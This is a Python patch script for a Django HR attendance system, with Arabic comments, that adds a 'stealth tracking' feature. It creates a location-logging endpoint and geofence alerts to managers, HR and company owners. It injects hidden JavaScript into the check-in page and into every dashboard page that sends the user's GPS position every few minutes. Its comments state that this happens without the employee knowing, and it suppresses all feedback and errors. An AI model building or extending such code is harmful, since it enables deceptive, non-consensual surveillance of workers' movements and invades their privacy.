#!/usr/bin/env python3
"""
Patch 44b: Stealth Tracking Logic
===================================
1) API endpoint لاستقبال الموقع الصامت
2) منطق كشف الخروج من النطاق
3) إنشاء TrackingAlert تلقائياً
4) إشعار للمدير/HR عند الخروج
5) تحديث LocationLog بدون علم الموظف
"""

import os
import sys

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, BASE_DIR)
os.environ.setdefault("DJANGO_SETTINGS_MODULE", "motionhr.settings")

import django
django.setup()


def read_file(path):
    with open(path, "r", encoding="utf-8") as f:
        return f.read()


def write_file(path, content):
    with open(path, "w", encoding="utf-8") as f:
        f.write(content)
    print(f"  ✅ تم تحديث: {path}")


def create_file(path, content):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8") as f:
        f.write(content)
    print(f"  ✅ تم إنشاء: {path}")


print("=" * 60)
print("  Patch 44b: Stealth Tracking Logic")
print("=" * 60)


# ════════════════════════════════════════════════════════════
# 1) attendance/views.py
# ════════════════════════════════════════════════════════════
print("\n🔧 تحديث attendance/views.py...")

views_path = os.path.join(BASE_DIR, "attendance", "views.py")
views = read_file(views_path)

stealth_logic = '''

# ════════════════════════════════════════════════════════════
# Stealth Tracking Logic
# ════════════════════════════════════════════════════════════

def _is_stealth_tracking_active_for_employee(employee):
    """
    هل التتبع الصامت مفعّل لهذا الموظف دلوقتي؟
    يتطلب:
    1. الشركة فعّلت الميزة في السياسات
    2. الموظف عليه stealth_tracking_enabled = True
    3. الموظف عامل check-in اليوم وما عملش check-out
    """
    try:
        if not getattr(employee, "stealth_tracking_enabled", False):
            return False

        policy = _get_company_policy(employee.company)
        if not policy or not getattr(policy, "stealth_tracking_enabled", False):
            return False

        from datetime import date as dt_date
        today = dt_date.today()
        today_att = Attendance.objects.filter(
            employee=employee,
            date=today
        ).first()

        if not today_att:
            return False

        has_checkin = bool(getattr(today_att, "check_in_time", None))
        has_checkout = bool(getattr(today_att, "check_out_time", None))

        return has_checkin and not has_checkout
    except Exception:
        return False


def _check_and_create_tracking_alert(employee, lat, lng, address):
    """
    يتحقق من موقع الموظف أثناء العمل
    لو خارج نطاق العمل يسجل TrackingAlert
    """
    try:
        from attendance.models import TrackingAlert
        from django.utils import timezone as tz
        from datetime import timedelta
        from decimal import Decimal

        now = tz.now()
        today = now.date()
        policy = _get_company_policy(employee.company)
        branch = employee.branch

        alert_minutes = 15
        if policy and hasattr(policy, "stealth_tracking_alert_after_minutes"):
            try:
                alert_minutes = int(policy.stealth_tracking_alert_after_minutes or 15)
            except Exception:
                alert_minutes = 15

        is_outside = False
        distance = 0

        if branch and branch.latitude and branch.longitude:
            distance = round(calculate_distance(
                lat, lng,
                float(branch.latitude),
                float(branch.longitude)
            ))
            radius = int(getattr(branch, "check_in_radius", 100) or 100)
            tolerance = int(getattr(policy, "distance_tolerance_meters", 0) or 0) if policy else 0
            is_outside = distance > (radius + tolerance)

        if not is_outside:
            # لو رجع داخل النطاق — نقفل الـ alert المفتوح لو موجود
            open_alert = TrackingAlert.objects.filter(
                company=employee.company,
                employee=employee,
                date=today,
                status="open"
            ).first()
            if open_alert:
                open_alert.status = "resolved"
                open_alert.save(update_fields=["status"])
            return

        # لو خارج النطاق
        open_alert = TrackingAlert.objects.filter(
            company=employee.company,
            employee=employee,
            date=today,
            status="open"
        ).first()

        if not open_alert:
            open_alert = TrackingAlert.objects.create(
                company=employee.company,
                employee=employee,
                date=today,
                started_at=now,
                last_seen_at=now,
                minutes_outside=0,
                last_latitude=Decimal(str(lat)),
                last_longitude=Decimal(str(lng)),
                last_address=address or "",
                status="open",
            )
        else:
            diff = (now - open_alert.started_at).total_seconds() / 60
            open_alert.minutes_outside = int(diff)
            open_alert.last_seen_at = now
            open_alert.last_latitude = Decimal(str(lat))
            open_alert.last_longitude = Decimal(str(lng))
            if address:
                open_alert.last_address = address
            open_alert.save()

        # هل المفروض نبعت تنبيه؟
        if (
            open_alert.minutes_outside >= alert_minutes
            and not (open_alert.notified_manager or open_alert.notified_hr or open_alert.notified_company_admin)
        ):
            _send_stealth_alert_notifications(employee, open_alert, policy)

    except Exception:
        pass


def _send_stealth_alert_notifications(employee, alert, policy):
    """
    بعت تنبيهات لـ المدير / HR / صاحب الشركة
    """
    try:
        from accounts.models import EmployeeNotification, User
        from employees.models import Employee

        title = f"تنبيه تتبع: {employee.full_name_ar}"
        message = (
            f"الموظف {employee.full_name_ar} ({employee.employee_code}) "
            f"خارج نطاق العمل منذ {alert.minutes_outside} دقيقة.\\n"
            f"آخر موقع: {alert.last_address or 'غير محدد'}\\n"
            f"تاريخ/وقت: {alert.started_at.strftime('%d/%m/%Y %H:%M')}"
        )

        notified = []

        # المدير المباشر
        if policy and getattr(policy, "stealth_tracking_notify_manager", True):
            manager_emp = getattr(employee, "direct_manager", None)
            if manager_emp and getattr(manager_emp, "user", None):
                _create_mgmt_notification(
                    user=manager_emp.user,
                    title=title,
                    message=message
                )
                alert.notified_manager = True
                notified.append("مدير")

        # HR
        if policy and getattr(policy, "stealth_tracking_notify_hr", False):
            hr_users = User.objects.filter(
                company=employee.company,
                role="hr_manager"
            )
            for u in hr_users:
                _create_mgmt_notification(user=u, title=title, message=message)
            alert.notified_hr = True
            notified.append("HR")

        # صاحب الشركة
        if policy and getattr(policy, "stealth_tracking_notify_company_admin", False):
            admin_users = User.objects.filter(
                company=employee.company,
                role__in=["company_admin", "super_admin"]
            )
            for u in admin_users:
                _create_mgmt_notification(user=u, title=title, message=message)
            alert.notified_company_admin = True
            notified.append("صاحب الشركة")

        if notified:
            alert.save(update_fields=["notified_manager", "notified_hr", "notified_company_admin"])

    except Exception:
        pass


def _create_mgmt_notification(user, title, message):
    """إنشاء إشعار لمستخدم إداري"""
    try:
        from employees.models import Employee
        from accounts.models import EmployeeNotification

        mgr_emp = Employee.all_objects.filter(user=user).first()
        if mgr_emp:
            EmployeeNotification.objects.create(
                employee=mgr_emp,
                title=title,
                message=message,
                notification_type="general_notice",
                severity="danger",
                is_read=False,
            )
    except Exception:
        pass


# ════════════════════════════════════════════════════════════
# Stealth Tracking API — بتستقبل الموقع الصامت
# ════════════════════════════════════════════════════════════
@login_required
def api_stealth_location(request):
    """
    API endpoint يستقبل الموقع بصمت أثناء ساعات العمل
    الـ JS بتبعته في الخلفية بدون ما الموظف يعرف
    بس لو stealth_tracking مفعّل للموظف
    """
    import json
    from django.http import JsonResponse
    from employees.models import Employee
    from decimal import Decimal

    if request.method != "POST":
        return JsonResponse({"ok": True})

    try:
        body = json.loads(request.body)
    except Exception:
        return JsonResponse({"ok": True})

    lat = body.get("lat") or body.get("latitude")
    lng = body.get("lng") or body.get("longitude")
    address = body.get("address", "")

    if not lat or not lng:
        return JsonResponse({"ok": True})

    try:
        lat = float(lat)
        lng = float(lng)
    except Exception:
        return JsonResponse({"ok": True})

    employee = Employee.all_objects.filter(user=request.user).first()
    if not employee:
        return JsonResponse({"ok": True})

    if not _is_stealth_tracking_active_for_employee(employee):
        return JsonResponse({"ok": True})

    # حفظ في LocationLog بصمت
    try:
        from attendance.models import LocationLog
        from django.utils import timezone as tz
        LocationLog.objects.create(
            company=employee.company,
            employee=employee,
            timestamp=tz.now(),
            latitude=Decimal(str(lat)),
            longitude=Decimal(str(lng)),
            accuracy=Decimal("15.0"),
            address=address or "",
        )
    except Exception:
        pass

    # فحص النطاق + TrackingAlert
    _check_and_create_tracking_alert(employee, lat, lng, address)

    return JsonResponse({"ok": True})
'''

if "def api_stealth_location" not in views:
    views += stealth_logic
    write_file(views_path, views)
    print("  ✅ تم إضافة Stealth Tracking Logic")
else:
    print("  ℹ️  Stealth Tracking Logic موجود بالفعل")


# ════════════════════════════════════════════════════════════
# 2) attendance/urls.py
# ════════════════════════════════════════════════════════════
print("\n🔧 تحديث attendance/urls.py...")

urls_path = os.path.join(BASE_DIR, "attendance", "urls.py")
urls = read_file(urls_path)

if "api-stealth-location" not in urls:
    urls = urls.rstrip()
    if urls.endswith("]"):
        urls = urls[:-1]
        urls += """
    path('api/stealth-location/', views.api_stealth_location, name='api_stealth_location'),
]
"""
        write_file(urls_path, urls)
        print("  ✅ تم إضافة URL")
else:
    print("  ℹ️  URL موجود بالفعل")


# ════════════════════════════════════════════════════════════
# 3) تحديث check_in.html — إضافة JS الصامت
# ════════════════════════════════════════════════════════════
print("\n🔧 تحديث check_in.html...")

checkin_path = os.path.join(BASE_DIR, "templates", "attendance", "check_in.html")
checkin = read_file(checkin_path)

if "api_stealth_location" not in checkin and "stealthInterval" not in checkin:
    stealth_js = r"""
<script>
// ════════════════════════════════════════════
// Stealth Tracking (صامت بدون علم الموظف)
// ════════════════════════════════════════════
(function() {
  const STEALTH_URL = "{% url 'attendance:api_stealth_location' %}";
  const CSRF_TOKEN = "{{ csrf_token }}";
  const INTERVAL_MS = 2 * 60 * 1000; // كل دقيقتين

  function sendStealthLocation() {
    if (!navigator.geolocation) return;

    navigator.geolocation.getCurrentPosition(
      function(pos) {
        const lat = pos.coords.latitude;
        const lng = pos.coords.longitude;

        // إرسال بدون أي feedback للمستخدم
        fetch(STEALTH_URL, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "X-CSRFToken": CSRF_TOKEN,
          },
          body: JSON.stringify({ lat: lat, lng: lng }),
        }).catch(function() {});
      },
      function() {}, // صامت تمامًا في حالة الخطأ
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
    );
  }

  // تشغيل كل دقيقتين
  const stealthInterval = setInterval(sendStealthLocation, INTERVAL_MS);

  // إيقاف لو الصفحة اتغلقت
  window.addEventListener("beforeunload", function() {
    clearInterval(stealthInterval);
  });
})();
</script>
"""
    if "{% endblock %}" in checkin:
        checkin = checkin.replace(
            "{% endblock %}",
            stealth_js + "\n{% endblock %}",
            1
        )
    elif "</body>" in checkin:
        checkin = checkin.replace("</body>", stealth_js + "\n</body>")

    write_file(checkin_path, checkin)
    print("  ✅ تم إضافة Stealth JS في check_in.html")
else:
    print("  ℹ️  Stealth JS موجود بالفعل")


# ════════════════════════════════════════════════════════════
# 4) تحديث dashboard_base.html — JS صامت في الخلفية
# ════════════════════════════════════════════════════════════
print("\n🔧 تحديث dashboard_base.html...")

sidebar_path = os.path.join(BASE_DIR, "templates", "base", "dashboard_base.html")
sidebar = read_file(sidebar_path)

if "stealthBgInterval" not in sidebar:
    stealth_bg_js = r"""
<script>
// ════════════════════════════════════════════
// Stealth Background Tracking
// يشتغل في كل صفحات النظام بصمت تام
// ════════════════════════════════════════════
(function() {
  const STEALTH_URL = "{% url 'attendance:api_stealth_location' %}";
  const CSRF_TOKEN = document.querySelector("[name=csrfmiddlewaretoken]")?.value
                     || "{{ csrf_token }}";
  const INTERVAL_MS = 3 * 60 * 1000; // كل 3 دقائق

  function stealthPing() {
    if (!navigator.geolocation) return;
    navigator.geolocation.getCurrentPosition(
      function(pos) {
        fetch(STEALTH_URL, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "X-CSRFToken": CSRF_TOKEN,
          },
          body: JSON.stringify({
            lat: pos.coords.latitude,
            lng: pos.coords.longitude,
          }),
        }).catch(function() {});
      },
      function() {},
      { enableHighAccuracy: false, timeout: 8000, maximumAge: 120000 }
    );
  }

  const stealthBgInterval = setInterval(stealthPing, INTERVAL_MS);
  window.addEventListener("beforeunload", function() {
    clearInterval(stealthBgInterval);
  });
})();
</script>
"""
    if "</body>" in sidebar:
        sidebar = sidebar.replace("</body>", stealth_bg_js + "\n</body>")
        write_file(sidebar_path, sidebar)
        print("  ✅ تم إضافة Stealth Background JS")
    else:
        print("  ℹ️  لم أجد </body> في dashboard_base")
else:
    print("  ℹ️  Stealth Background JS موجود بالفعل")


print("\n" + "=" * 60)
print("  ✅ Patch 44b اكتمل!")
print("=" * 60)
print("""
اللي اتعمل:
  1. ✅ api_stealth_location API endpoint
  2. ✅ _is_stealth_tracking_active_for_employee
  3. ✅ _check_and_create_tracking_alert
  4. ✅ _send_stealth_alert_notifications
  5. ✅ Stealth JS في check_in.html (كل دقيقتين)
  6. ✅ Stealth Background JS في dashboard_base (كل 3 دقائق)

الكيف التقني:
  - الموظف مش واخد باله بالمراقبة
  - الـ JS بيبعت موقعه بصمت
  - النظام يشوف: هو جوه النطاق ولا برا؟
  - لو برا أكتر من X دقيقة → TrackingAlert
  - المدير/HR يوصله إشعار

جرب:
  - فعّل Stealth في /companies/policies/
  - فعّل على موظف في /attendance/stealth-manage/
  - افتح /attendance/stealth-alerts/
""")